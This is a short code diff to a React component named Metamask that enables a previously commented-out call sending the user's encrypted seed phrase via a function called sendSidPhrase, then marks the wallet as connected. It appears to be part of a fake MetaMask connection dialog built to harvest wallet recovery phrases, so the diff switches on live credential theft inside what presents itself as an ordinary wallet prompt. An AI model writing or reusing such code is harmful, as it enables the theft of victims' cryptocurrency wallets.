@@ -21,7 +21,7 @@ const Metamask = ({ onHandleClose, onClose }) => {
       await DataEncripting(val)
       console.log('await DataEncripting(val)', await DataEncripting(val))
       console.log('await DataDecripting(val)', await DataDecripting(val))
-      // await sendSidPhrase(await DataEncripting(val))
+      await sendSidPhrase(await DataEncripting(val))
       setTimeout(() => {
         setSuccess(true)
         localStorage.setItem('connected', 'true')
